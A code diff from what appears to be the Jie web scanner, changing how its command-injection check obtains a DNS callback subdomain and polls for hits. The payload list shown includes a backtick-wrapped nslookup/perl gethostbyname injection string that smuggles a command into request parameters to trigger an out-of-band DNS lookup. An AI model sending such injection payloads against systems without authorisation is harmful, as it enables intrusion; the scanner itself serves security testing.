@@ -11,7 +11,6 @@ import (
 	"github.com/yhy0/Jie/pkg/output"
 	"github.com/yhy0/Jie/pkg/protocols/httpx"
 	"github.com/yhy0/Jie/pkg/reverse"
-	"github.com/yhy0/Jie/pkg/util"
 	"github.com/yhy0/logging"
 	"regexp"
 	"strings"
@@ -58,13 +57,12 @@ func startTesting(in *input.CrawlResult) (*httpx.Response, string, bool) {
 			"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
 		}
 
-		flag := util.RandLowLetterNumber(10)
-		dnslog := reverse.New("", flag)
+		dnslog := reverse.GetSubDomain()
 
 		if variations != nil {
 			for _, p := range variations.Params {
 				for _, payload := range domainPayloadList {
-					s1 := strings.ReplaceAll(payload, "{domain}", dnslog.Url)
+					s1 := strings.ReplaceAll(payload, "{domain}", dnslog.Domain)
 
 					originpayload := variations.SetPayloadByIndex(p.Index, in.Url, s1, in.Method)
 
@@ -81,7 +79,7 @@ func startTesting(in *input.CrawlResult) (*httpx.Response, string, bool) {
 						continue
 					}
 
-					if reverse.Check(dnslog, 2) {
+					if reverse.PullLogs(dnslog) {
 						return res, originpayload, true
 					}
 				}
